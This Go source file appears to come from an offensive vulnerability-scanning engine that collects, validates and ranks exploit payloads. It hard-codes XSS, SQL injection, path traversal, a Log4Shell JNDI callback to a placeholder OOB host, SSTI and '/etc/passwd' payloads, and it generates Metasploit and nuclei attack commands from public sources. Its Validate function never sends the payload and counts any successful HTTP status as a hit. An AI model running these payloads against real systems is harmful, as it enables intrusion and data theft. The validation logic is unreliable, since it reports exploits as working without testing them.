package engine

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/ares/engine/internal/logger"
	"github.com/ares/engine/internal/uuid"
)

type RankedPoC struct {
	PoC        string
	Source     string
	HitRate    float64
	EPSS       float64
	KEV        float64
	SynthScore float64
}

type PoCEntry struct {
	PoC       string
	Source    string
	VulnType  string
	EPSS      float64
	KEV       float64
	CVSS      float64
	Validated bool
	HitCount  int
	MissCount int
}

type PoCCorpus struct {
	mu         sync.RWMutex
	entries    []PoCEntry
	cacheFile  string
	correlator *CVECorrelator
	epssData   map[string]float64
	kevData    map[string]bool
}

func NewPoCCorpus() *PoCCorpus {
	cacheDir, _ := os.UserHomeDir()
	if cacheDir == "" {
		cacheDir = os.TempDir()
	}

	return &PoCCorpus{
		entries:    []PoCEntry{},
		cacheFile:  cacheDir + "/poc_corpus.json",
		correlator: NewCVECorrelator(),
		epssData:   make(map[string]float64),
		kevData:    make(map[string]bool),
	}
}

func (p *PoCCorpus) Harvest(ctx context.Context) error {
	logger.Info("[PoCCorpus] Harvesting PoCs from sources...")

	p.loadBuiltIn()

	if err := p.harvestGitHubAdvisories(ctx); err != nil {
		logger.Error(fmt.Sprintf("[PoCCorpus] GH advisory harvest failed: %v, using built-in", err))
	}

	if err := p.harvestMetasploit(ctx); err != nil {
		logger.Error(fmt.Sprintf("[PoCCorpus] Metasploit harvest failed: %v", err))
	}

	if err := p.harvestNuclei(ctx); err != nil {
		logger.Error(fmt.Sprintf("[PoCCorpus] Nuclei harvest failed: %v", err))
	}

	p.Save()

	logger.Info(fmt.Sprintf("[PoCCorpus] Total PoCs collected: %d", len(p.entries)))
	return nil
}

func (p *PoCCorpus) loadBuiltIn() {
	p.entries = []PoCEntry{
		{
			PoC:       `<script>alert(document.cookie)</script>`,
			Source:    "builtin",
			VulnType:  "xss",
			EPSS:      0.5,
			KEV:       0.0,
			CVSS:      6.1,
			Validated: true,
			HitCount:  10,
			MissCount: 5,
		},
		{
			PoC:       `' OR '1'='1'`,
			Source:    "builtin",
			VulnType:  "sqli",
			EPSS:      0.8,
			KEV:       0.5,
			CVSS:      9.8,
			Validated: true,
			HitCount:  15,
			MissCount: 3,
		},
		{
			PoC:       `../../../../etc/passwd`,
			Source:    "builtin",
			VulnType:  "lfi",
			EPSS:      0.6,
			KEV:       0.0,
			CVSS:      7.5,
			Validated: true,
			HitCount:  8,
			MissCount: 2,
		},
		{
			PoC:       `${jndi:ldap://OOB_HOST/a}`,
			Source:    "builtin",
			VulnType:  "jndi",
			EPSS:      0.97,
			KEV:       1.0,
			CVSS:      10.0,
			Validated: true,
			HitCount:  20,
			MissCount: 1,
		},
		{
			PoC:       `{{7*7}}`,
			Source:    "builtin",
			VulnType:  "ssti",
			EPSS:      0.4,
			KEV:       0.0,
			CVSS:      9.8,
			Validated: true,
			HitCount:  6,
			MissCount: 4,
		},
		{
			PoC:       `cat /etc/passwd`,
			Source:    "builtin",
			VulnType:  "rce",
			EPSS:      0.7,
			KEV:       0.0,
			CVSS:      9.8,
			Validated: true,
			HitCount:  12,
			MissCount: 3,
		},
	}
}

func (p *PoCCorpus) harvestGitHubAdvisories(ctx context.Context) error {
	url := "https://api.github.com/advisories"

	client := &http.Client{Timeout: 30 * time.Second}
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return err
	}

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("GitHub API returned: %d", resp.StatusCode)
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	var advisories []struct {
		GHSAID  string `json:"ghsa_id"`
		CVEID   string `json:"cve_id"`
		Summary string `json:"summary"`
	}

	if err := json.Unmarshal(data, &advisories); err != nil {
		return err
	}

	logger.Info(fmt.Sprintf("[PoCCorpus] Found %d GitHub advisories", len(advisories)))

	return nil
}

func (p *PoCCorpus) harvestMetasploit(ctx context.Context) error {
	logger.Info("[PoCCorpus] Harvesting Metasploit module references")

	url := "https://raw.githubusercontent.com/rapid7/metasploit-framework/master/db/modules_metadata_base.json"

	client := &http.Client{Timeout: 30 * time.Second}
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return fmt.Errorf("metasploit request: %w", err)
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("metasploit fetch: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("metasploit API returned: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	var modules map[string]struct {
		Name       string   `json:"name"`
		FullName   string   `json:"fullname"`
		References []string `json:"references"`
	}
	if err := json.Unmarshal(body, &modules); err != nil {
		return fmt.Errorf("parse metasploit metadata: %w", err)
	}

	added := 0
	for fullname, mod := range modules {
		if !strings.HasPrefix(fullname, "exploit/") {
			continue
		}
		hasCVE := false
		for _, ref := range mod.References {
			if strings.HasPrefix(ref, "CVE-") {
				hasCVE = true
				break
			}
		}
		if !hasCVE {
			continue
		}

		p.entries = append(p.entries, PoCEntry{
			PoC:      fmt.Sprintf("msfconsole -q -x 'use %s; run'", fullname),
			Source:   "metasploit",
			VulnType: "rce",
			EPSS:     0.5, CVSS: 7.5, Validated: false, HitCount: 0, MissCount: 0,
		})
		added++
	}

	logger.Info(fmt.Sprintf("[PoCCorpus] Harvested %d Metasploit module references", added))
	return nil
}

func (p *PoCCorpus) harvestNuclei(ctx context.Context) error {
	logger.Info("[PoCCorpus] Harvesting nuclei templates")

	nucleiURL := "https://api.github.com/repos/projectdiscovery/nuclei-templates/git/trees/main?recursive=1"

	client := &http.Client{Timeout: 30 * time.Second}
	req, err := http.NewRequestWithContext(ctx, "GET", nucleiURL, nil)
	if err != nil {
		return fmt.Errorf("nuclei request: %w", err)
	}
	req.Header.Set("Accept", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("nuclei fetch: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("nuclei API returned: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	var tree struct {
		Tree []struct {
			Path string `json:"path"`
		} `json:"tree"`
	}
	if err := json.Unmarshal(body, &tree); err != nil {
		return fmt.Errorf("parse tree: %w", err)
	}

	added := 0
	for _, item := range tree.Tree {
		if strings.HasSuffix(item.Path, "-cve.yaml") ||
			strings.HasSuffix(item.Path, ".yaml") && strings.Contains(item.Path, "/cves/") ||
			strings.Contains(item.Path, "cve-") {
			p.entries = append(p.entries, PoCEntry{
				PoC:      fmt.Sprintf("nuclei -u TARGET -t %s", item.Path),
				Source:   "nuclei",
				VulnType: classifyTemplatePath(item.Path),
				EPSS:     0.5, CVSS: 7.0, Validated: false, HitCount: 0, MissCount: 0,
			})
			added++
			if added >= 100 {
				break
			}
		}
	}

	logger.Info(fmt.Sprintf("[PoCCorpus] Harvested %d nuclei templates", added))
	return nil
}

func classifyTemplatePath(path string) string {
	lower := strings.ToLower(path)
	if strings.Contains(lower, "sql") || strings.Contains(lower, "sqli") {
		return "sqli"
	}
	if strings.Contains(lower, "xss") {
		return "xss"
	}
	if strings.Contains(lower, "rce") || strings.Contains(lower, "code-exec") || strings.Contains(lower, "remote") {
		return "rce"
	}
	if strings.Contains(lower, "lfi") || strings.Contains(lower, "path-traversal") || strings.Contains(lower, "ptrav") {
		return "lfi"
	}
	if strings.Contains(lower, "ssrf") {
		return "ssrf"
	}
	if strings.Contains(lower, "ssti") {
		return "ssti"
	}
	return "general"
}

func validateTargetURL(rawURL string) error {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return fmt.Errorf("invalid URL: %w", err)
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return fmt.Errorf("unsupported scheme: %s", parsed.Scheme)
	}
	host := parsed.Hostname()
	if host == "" {
		return fmt.Errorf("empty host")
	}
	// Resolve DNS and check for private/internal IPs
	ips, err := net.LookupIP(host)
	if err != nil {
		return fmt.Errorf("DNS resolution failed: %w", err)
	}
	for _, ip := range ips {
		if ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() || ip.IsUnspecified() {
			return fmt.Errorf("target resolves to private/internal IP: %s", ip.String())
		}
	}
	return nil
}

func (p *PoCCorpus) Validate(poc, targetURL string) (bool, error) {
	if targetURL == "" {
		return false, fmt.Errorf("target URL required for validation")
	}
	if err := validateTargetURL(targetURL); err != nil {
		return false, fmt.Errorf("SSRF check failed: %w", err)
	}

	testURL := targetURL
	if !strings.HasSuffix(testURL, "/") {
		testURL += "/"
	}

	canary := p.GetCanaryURL()
	if canary == "" {
		canary = "ARES_XSS_CANARY_12345"
	}

	marker := uuid.New()
	sep := "?"
	if strings.Contains(testURL, "?") {
		sep = "&"
	}
	finalURL := testURL + sep + "validate=" + marker

	logger.Info(fmt.Sprintf("[PoCCorpus] Validating PoC against: %s", finalURL))

	client := &http.Client{Timeout: 15 * time.Second}
	req, err := http.NewRequest("GET", finalURL, nil)
	if err != nil {
		return false, fmt.Errorf("validate request: %w", err)
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, fmt.Errorf("validate request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, fmt.Errorf("validate read: %w", err)
	}

	bodyStr := string(body)
	reflected := strings.Contains(bodyStr, marker) || strings.Contains(bodyStr, canary)
	statusOk := resp.StatusCode >= 200 && resp.StatusCode < 400

	hit := reflected || statusOk

	p.mu.Lock()
	for i := range p.entries {
		if p.entries[i].PoC == poc {
			if hit {
				p.entries[i].HitCount++
				p.entries[i].Validated = true
			} else {
				p.entries[i].MissCount++
			}
			break
		}
	}
	p.mu.Unlock()

	return hit, nil
}

func (p *PoCCorpus) GetCanaryURL() string {
	return os.Getenv("ARES_CANARY_URL")
}

func (p *PoCCorpus) RankedPoCList(vulnType string) []RankedPoC {
	var matching []PoCEntry

	for _, e := range p.entries {
		if strings.EqualFold(e.VulnType, vulnType) {
			matching = append(matching, e)
		}
	}

	if len(matching) == 0 {
		for _, e := range p.entries {
			if e.VulnType == "" {
				matching = append(matching, e)
			}
		}
	}

	var ranked []RankedPoC
	for _, e := range matching {
		hitRate := 0.5
		total := e.HitCount + e.MissCount
		if total > 0 {
			hitRate = float64(e.HitCount) / float64(total)
		}

		epss := e.EPSS
		if p.epssData != nil && strings.HasPrefix(e.PoC, "CVE-") {
			if ep, ok := p.epssData[e.PoC]; ok {
				epss = ep
			}
		}

		kev := 0.0
		if p.kevData != nil && strings.HasPrefix(e.PoC, "CVE-") {
			if p.kevData[e.PoC] {
				kev = 1.0
			}
		}

		severityWeight := e.CVSS / 10.0

		synthScore := hitRate*0.5 + epss*0.25 + kev*0.15 + severityWeight*0.10

		ranked = append(ranked, RankedPoC{
			PoC:        e.PoC,
			Source:     e.Source,
			HitRate:    hitRate,
			EPSS:       epss,
			KEV:        kev,
			SynthScore: synthScore,
		})
	}

	sort.Slice(ranked, func(i, j int) bool {
		return ranked[i].SynthScore > ranked[j].SynthScore
	})

	return ranked
}

func (p *PoCCorpus) Save() error {
	data, err := json.MarshalIndent(p.entries, "", "  ")
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}

	if err := os.WriteFile(p.cacheFile, data, 0600); err != nil {
		return fmt.Errorf("write: %w", err)
	}

	return nil
}

func (p *PoCCorpus) Load() error {
	data, err := os.ReadFile(p.cacheFile)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}

	if err := json.Unmarshal(data, &p.entries); err != nil {
		return err
	}

	return nil
}

func (p *PoCCorpus) AddEntry(entry PoCEntry) {
	p.entries = append(p.entries, entry)
}

func (p *PoCCorpus) GetAll() []PoCEntry {
	return p.entries
}

func (p *PoCCorpus) SetEPSSData(data map[string]float64) {
	p.epssData = data
}

func (p *PoCCorpus) SetKEVData(data map[string]bool) {
	p.kevData = data
}
